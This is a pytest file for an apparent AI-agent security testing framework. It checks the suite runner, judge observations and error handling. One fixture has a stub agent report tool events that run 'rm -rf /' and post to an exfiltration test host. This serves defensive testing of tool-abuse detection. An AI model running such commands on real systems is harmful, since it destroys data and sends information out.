
import pytest

from agentsec.adapters.base import AgentAdapter, AgentResponse
from agentsec.evaluator.base import Judge, JudgeVerdict
from agentsec.observability.observation import Observation
from agentsec.runner import run_suite
from agentsec.tests.models import TestCase, Turn


class _StubAdapter(AgentAdapter):
    def __init__(self):
        self.name = "stub"
        self.calls: list[tuple[str, str]] = []

    async def send(self, message, session_id):
        self.calls.append((message, session_id))
        return AgentResponse(content=f"echo:{message}", status_code=200, request_url="http://stub/")


class _StubJudge(Judge):
    def __init__(self):
        self.observations: list[Observation] = []

    async def evaluate(self, test_case, observation):
        self.observations.append(observation)
        return JudgeVerdict(
            passed="refuse" in observation.response.content.lower() or test_case.id == "ok",
            reasoning="stub",
            judge_type="llm",
        )


@pytest.mark.asyncio
async def test_runner_assembles_observation_and_calls_async_judge():
    adapter = _StubAdapter()
    judge = _StubJudge()
    cases = [
        TestCase(id="ok", category="c", description="d",
                 turns=[Turn(attack="hello")], expected_behavior="refusal", severity="low"),
        TestCase(id="bad", category="c", description="d",
                 turns=[Turn(attack="hello again")], expected_behavior="refusal", severity="low"),
    ]
    results = await run_suite(adapter, judge, cases, concurrency=2)
    assert len(results) == 2
    by_id = {r.test_id: r for r in results}
    assert by_id["ok"].status == "passed"
    assert by_id["bad"].status == "failed"
    assert all(r.observations for r in results)
    # Each test got a unique session id
    sessions = {sid for _, sid in adapter.calls}
    assert len(sessions) == 2


@pytest.mark.asyncio
async def test_runner_threads_response_tool_events_into_observation():
    """Stage C C1 fix: whatever the adapter records on `AgentResponse.tool_events`
    MUST appear in `Observation.tool_events` so `tool_event_not_invoked` sees
    real invocations instead of the empty list it saw before the fix."""

    class _ToolEmittingAdapter(AgentAdapter):
        name = "tool-emit"

        async def send(self, message, session_id):
            return AgentResponse(
                content="running",
                status_code=200,
                tool_events=[
                    {"tool": "shell.exec", "args": "rm -rf /"},
                    {"tool": "http.post", "args": "https://exfil.agentsec.test"},
                ],
            )

    judge = _StubJudge()
    cases = [
        TestCase(
            id="oc-tool-runner",
            category="tool_abuse",
            description="d",
            turns=[Turn(attack="x")],
            expected_behavior="refusal",
            severity="critical",
        ),
    ]
    results = await run_suite(_ToolEmittingAdapter(), judge, cases, concurrency=1)

    assert len(results) == 1
    assert len(judge.observations) == 1
    obs = judge.observations[0]
    assert obs.tool_events == [
        {"tool": "shell.exec", "args": "rm -rf /"},
        {"tool": "http.post", "args": "https://exfil.agentsec.test"},
    ]


@pytest.mark.asyncio
async def test_runner_marks_adapter_exception_as_error():
    class BoomAdapter(AgentAdapter):
        name = "boom"
        async def send(self, message, session_id):
            raise RuntimeError("network down")

    cases = [TestCase(id="x", category="c", description="d",
                      turns=[Turn(attack="hi")], expected_behavior="refusal", severity="low")]
    results = await run_suite(BoomAdapter(), _StubJudge(), cases, concurrency=1)
    assert results[0].status == "error"
    assert "network down" in (results[0].error or "")
